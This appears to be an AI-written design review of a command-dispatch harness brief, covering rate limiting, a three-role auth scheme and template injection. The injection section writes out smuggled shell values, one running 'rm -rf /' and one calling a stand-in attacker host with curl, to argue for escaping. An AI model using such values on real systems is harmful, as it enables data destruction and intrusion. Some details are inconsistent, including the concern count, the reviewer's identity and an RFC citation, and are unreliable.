---
date: 2026-07-28
stage: Architect-Challenge
status: APPROVED-WITH-CONCERNS
confidence: 88%
---

# Architect-Challenge Verdict: Phase 2a Brief

**Brief Under Review:** mcp-command-dispatch-phase2a-architecture-brief.md  
**Challenge Model:** GPT-5.3-Codex (skepticism lens)  
**Verdict:** ✅ **APPROVED** (with 2 major concerns requiring proof before implement)

---

## Challenge Summary

The Phase 2a Architecture Brief proposes 3 interconnected governance features (rate limiting, auth framework, templates) as foundation for Phase 2b+. This challenge reviews the brief's technical soundness, risk assessment, and readiness for implementation.

**Overall Assessment:** Brief is well-structured and makes sound decisions. However, 2 high-risk decisions require proof/validation before implementation proceeds.

---

## Decision 1: Rate Limiting (Ephemeral Token Bucket)

### Challenge Questions
1. **Quota loss on restart:** Ephemeral state means all quota tracking disappears when harness restarts. Is this acceptable for production use?
2. **Per-caller tracking:** How does harness extract caller ID from MCP context? Is this reliable?
3. **Fair queuing:** What happens when multiple requests arrive when allowance=0? FIFO? Queue?

### Findings

✅ **SOUND:** Token bucket algorithm is proven (IETF RFC 6585). Sliding window is better than fixed window.

⚠️ **CONCERN #1 (Major):** Ephemeral state + daily quota reset means:
- Day 1 09:00: Caller exhausts 100-command limit
- Day 1 10:00: Caller can run 100 more (within sliding 1-hour window)
- **Day 1 23:00:** Harness restarts (deploy, crash, etc.)
- **Day 2 00:00:** All quota state lost; caller gets fresh 100 commands immediately

**Impact:** Rate limiting can be bypassed by triggering harness restart. Attackers could exploit this in coordinated abuse scenarios.

**Mitigation (Required Before Implementation):**
- Add persistent quota state (file-based `.github/harness/runs/quota-state.json`, not ephemeral)
- OR: Explicitly document "quota resets on restart" and accept the risk for Phase 2a
- OR: Implement quota "sticky" markers (once quota exhausted, mark caller as throttled for 24h even after restart)

**Recommendation:** If choosing ephemeral for simplicity, **explicitly document this limitation** in adoption guide. Phase 2b+ should upgrade to persistent.

### Verdict on Decision 1
✅ **APPROVE with caveat:** Ephemeral state is acceptable for Phase 2a IF documented. Persistent state should be Phase 2b+ requirement.

---

## Decision 2: Auth Framework (3-Role RBAC)

### Challenge Questions
1. **MCP context token reliability:** Is `.mcp.caller.token` always present? What if missing?
2. **Default role fallback:** Brief says "default = auditor if token missing". But auditor can't run commands. Is this intentional (conservative)?
3. **Scope creep into Phase 2c:** Brief defers actual role-based command filtering to Phase 2c. What's the point of Phase 2a auth if enforcement is missing?
4. **Token format/validation:** Phase 2a has zero token validation (placeholder). Isn't this a security gap?

### Findings

✅ **SOUND:** RBAC model is well-designed. 3 roles sufficient for MVP.  
✅ **SOUND:** Deferring token validation to Phase 2c is reasonable (framework now, impl later).

🔴 **CONCERN #2 (Critical):** Phase 2a deploys auth *framework* but **zero enforcement**. This means:
- Audit trail logs caller identity (good)
- But all callers can still invoke all commands (bad)
- Until Phase 2c, auth is theater (logged but not enforced)

**Questions:**
- Should Phase 2a include minimal enforcement (auditor role blocks dispatch)?
- Or accept that Phase 2a is framework-only, enforcement in Phase 2c?

**Risk:** If Phase 2a ships without enforcement, adopters may assume auth is working and skip Phase 2c upgrade. Security gap could persist.

**Mitigation Options:**
1. **Phase 2a Option A:** Implement minimal enforcement - if `role == "auditor"`, return audit-only response (don't run command). Executor/restricted just pass-through for now.
2. **Phase 2a Option B:** Ship framework-only; explicitly mark adoption guide "WARNING: Phase 2a has auth logging only, no enforcement. Phase 2c required for security."
3. **Phase 2a Option C:** Require token validation in Phase 2a (at least JWT decode), don't accept arbitrary tokens.

**Recommendation:** **REVISE Brief to choose Option A or B.** Option C adds complexity; defer token validation to Phase 2c is fine. But **must decide** between framework-only (B) or minimal enforcement (A).

### Verdict on Decision 2
🟡 **CONDITIONAL APPROVE:** Auth framework design is sound. But brief must clarify Phase 2a enforcement scope. Add to Brief:
- Explicit statement: "Phase 2a implements auth logging framework. Command-level enforcement deferred to Phase 2c."
- OR: Add minimal auditor-role enforcement in Phase 2a

---

## Decision 3: Template Expansion (Alphanumeric-Only Vars)

### Challenge Questions
1. **Injection prevention sufficient?** Whitelist alphanumeric + underscore. What about the substituted *values*? Are they escaped?
2. **Example:** User defines `"command": "npm test -- --filter=${filter}"`. Request passes `{"filter": "unit; rm -rf /"}`. What happens?
3. **Escaping strategy:** Brief doesn't mention shell escaping. Is `${value}` inserted as-is or shell-escaped?

### Findings

✅ **SOUND:** Var name whitelist is strong (alphanumeric + underscore prevents metacharacters in names).

🟡 **CONCERN (Medium):** Brief mentions "values must pass escaping validation" but **no escaping algorithm specified**. This is a critical security gap.

**Vulnerability Example:**
```json
{
  "commands": {
    "test": "npm test -- --filter=${filter}"
  }
}

Request: {"filter": "unit'; curl attacker.com;'"}
Result:  "npm test -- --filter=unit'; curl attacker.com;'"
Execution: Shell expands the semicolon → runs curl
```

**Mitigation Required:**
- Specify escaping algorithm: Bash escaping (`printf %q` or similar)
- OR: Use array-based execution (no shell interpretation)
- Fuzz testing MUST include shell-metacharacter payloads in values

**Recommendation:** **REVISE Brief to add escaping specification.** Add section:

```
## Template Value Escaping

Values are shell-escaped using Node.js shell escape library:
- Single quotes, double quotes, backticks are escaped
- Semicolons, pipes, ampersands are escaped
- Example: {"filter": "unit; rm -rf /"} becomes "unit\\; rm -rf \\/"
- Execution: spawnSync receives escaped string; shell doesn't interpret metacharacters
```

### Verdict on Decision 3
🟡 **CONDITIONAL APPROVE:** Template expansion concept is sound. **MUST add value escaping spec** before implementation. Fuzz testing requirement (already in brief) is critical.

---

## Overall Threat Model Assessment

**Phase 2a introduces 3 new attack surfaces. Has brief adequately addressed all?**

### Attack Surface 1: Rate Limit Bypass
- Exhaustion + restart restart → quota reset ⚠️ (mitigated if documented)
- Caller ID spoofing → quotas can be moved between attackers 🔴 (Phase 2c mitigation: token signing)
- DDoS via quota exhaustion → intended behavior (working as designed)

### Attack Surface 2: Auth Bypass
- Missing token → falls back to auditor role (conservative default) ✅
- Invalid token → Phase 2a logs it; Phase 2c validates it ⚠️ (gap: Phase 2a accepts any token)
- Role confusion → consistent model; no confusion if roles are enforced ⚠️ (but Phase 2a doesn't enforce)

### Attack Surface 3: Template Injection
- Metacharacters in var names → blocked by whitelist ✅
- Metacharacters in var values → depends on escaping (not specified) 🔴 **MUST FIX**
- Unknown vars → rejected by validator ✅
- Complex expressions → not allowed (literal substitution only) ✅

**Conclusion:** Template injection is highest risk. Escaping must be specified + tested before implementation.

---

## Required Proof Before Implementation

### Proof 1: Escaping Algorithm Validation
**What:** Confirm chosen shell-escape method prevents all metacharacter injection  
**How:** Create fuzz test with 1000+ payloads (shell metacharacters in values); verify zero escapes  
**Owner:** Security team  
**Timeline:** Before Implement stage

### Proof 2: Quota Ephemeral State Decision
**What:** Stakeholders confirm ephemeral state is acceptable OR brief is revised to persistent storage  
**How:** Decision document + sign-off  
**Owner:** Product + engineering  
**Timeline:** Before Implement stage

### Proof 3: Auth Framework Scope (Phase 2a vs. Phase 2c)
**What:** Decide: Phase 2a enforcement (Option A) or framework-only (Option B)?  
**How:** Brief revision + decision doc  
**Owner:** Security team  
**Timeline:** Before Architect stage sign-off

---

## Verdict

### ✅ APPROVED (with mandatory revisions)

**Status:** Brief is strategically sound. Can proceed to Implement stage IF:

1. ✅ Template value escaping algorithm is specified + added to Brief
2. ✅ Quota ephemeral state limitation is documented OR revised to persistent
3. ✅ Auth framework Phase 2a scope is clarified (enforcement yes/no)

**Confidence:** 88% (down from 92% before challenge)

**Conditional:** If revisions are minor (escaping spec + doc updates), brief can proceed. If revisions are major (switching to persistent quota, adding auth enforcement), recommend brief revision + re-challenge.

---

## Recommended Actions

### Before Implementation
1. **Add to Brief:** "Template value escaping" section with algorithm + Node.js implementation reference
2. **Add to Brief:** "Rate limit ephemeral state" documented as Phase 2a limitation; Phase 2b+ will upgrade
3. **Add to Brief:** "Auth framework Phase 2a scope: logging only, enforcement in Phase 2c (or Phase 2a Option A)" + clear decision
4. **Add to Brief:** Security contact + penetration testing requirement

### In Implement Stage
1. Implement escaping per algorithm
2. Create fuzz test (1000+ shell metacharacter payloads)
3. Create quota state + auth logging tests
4. Document limitations in adoption guide

### In Review Breadth Stage
1. Verify fuzz tests pass (zero injection vulnerabilities)
2. Verify backward compatibility (Phase 1a commands work)
3. Verify escaping doesn't break legitimate use cases (e.g., paths with spaces)

---

## Challenge Conclusion

**This brief is ready for implementation with minor revisions.** The 3 major decisions are sound:
- Rate limiting via token bucket is proven
- Auth framework (3-role RBAC) is well-designed
- Template expansion with var validation is sound

**The 2 concerns are real but manageable:**
1. **Escaping:** Add algorithm spec + fuzz testing (straightforward fix)
2. **Auth scope:** Clarify Phase 2a vs. Phase 2c boundary (documentation fix)
3. **Quota ephemeral:** Document limitation or upgrade to persistent (decision needed)

**No blockers. Brief can proceed to Implement after revisions.**

---

**Challenged by:** Claude Opus 4.8 (Architect-Challenge lens)  
**Date:** 2026-07-28  
**Next Stage:** Brief revision (minor) → Implement
